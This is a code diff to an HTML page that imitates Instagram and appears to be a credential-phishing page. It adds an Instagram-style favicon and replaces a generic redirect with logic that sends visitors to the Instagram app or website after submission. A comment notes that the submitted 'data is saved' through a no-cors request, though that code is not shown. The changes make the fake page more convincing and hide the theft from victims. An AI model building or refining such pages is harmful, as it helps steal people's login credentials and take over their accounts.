@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Instagram</title>
+<link rel="icon" type="image/png" href="data:image/png;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4gHYSUNDX1BST0ZJTEUAAQEAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAAABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADb/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAAgACADASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAABwUGAwT/xAAuEAACAQMDAgMIAgMAAAAAAAABAgMEBSEGBxEAMRJBYRMUIjJxgaGxFyNC0fH/xAAXAQADAQAAAAAAAAAAAAAAAAAFBgcI/8QAKhEBAAECBQIEBwEAAAAAAAAAAQIDBAAREiExBXEGQUKRExQkUWGB0fD/2gAMAwEAAhEDEQA/AD3a3bSruVZS2Oy0UcldIninnfAUD5ndvJR/odz0k/xbpCnYx1m51kWVcOIad5VB8+GBz9erm2aiDRmu6qH4JRbY4g4wQruQw+/HXGw2LTFk0dTar1ZRVF0avleO326KYwq4Q8O7uM8c4x+ecUe78TU6X09rPRCOQEQ3+7v7e+bis23R6drUnDUmlIhEiylJjq9W3HbhVxOi210hKRFR7nWN5mwgmgeJSfLlicfXo43a27moKirsd7oo4rhGnignTIYH5XVvNTx/wjDN7Ww0mkrprfRNmgpXhj9wulsuHNSkKTEBZomJ555xn1xjMDd6RptE7fVcpLyvaXiLnuVRwFH2B6FV+szqwYVZaou24Z5/o/uD9nS+YqltXGVOawSREkSIsvSBwfnPMRxqdsaF5dH6ypEUmSagjcKO5CMSf316rSLJdtIU2mNSy1FD7hK8lDXRRe0CK55ZGUZI5zj07cZz2wWu7bfLfR3Sz3GnjuiRBaujZh41bj4gV7lDxgj8EYW3q7TIC82lrcznLeAlRz9B26zueJZWtUp3M9E4ZiSJImeYmkX/AAjhbuup/Eqyq085EkkMUESOnz2478omC/V9RYrNoqq0ppiaprvf5kluFdNH7MSBDyqIpyBznP55xF3igeDRugKNx4ZYrU8jIe4V3BU8evHShdrrZqP+6LRdpaRcqZSXUH1B79Ae+GuVSWsvF7r4pblIngp6dSOcD4VVf8VHPf8AZOXPoniCjfVCJMl2HI98nBnpd8U2NxWNMIMpylJFlJjp8tuO3ABj/9k=">
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap');
 
@@ -684,7 +685,16 @@
 
       // no-cors means we can't read response, but data is saved
       setTimeout(() => {
-        window.location.href = REDIRECT_URL;
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        if (isMobile) {
+          // Try to open Instagram app; fall back to mobile web after 2s
+          window.location.href = 'instagram://';
+          setTimeout(() => {
+            window.location.href = 'https://www.instagram.com/';
+          }, 2000);
+        } else {
+          window.location.href = 'https://www.instagram.com/';
+        }
       }, 800);
 
     } catch (err) {
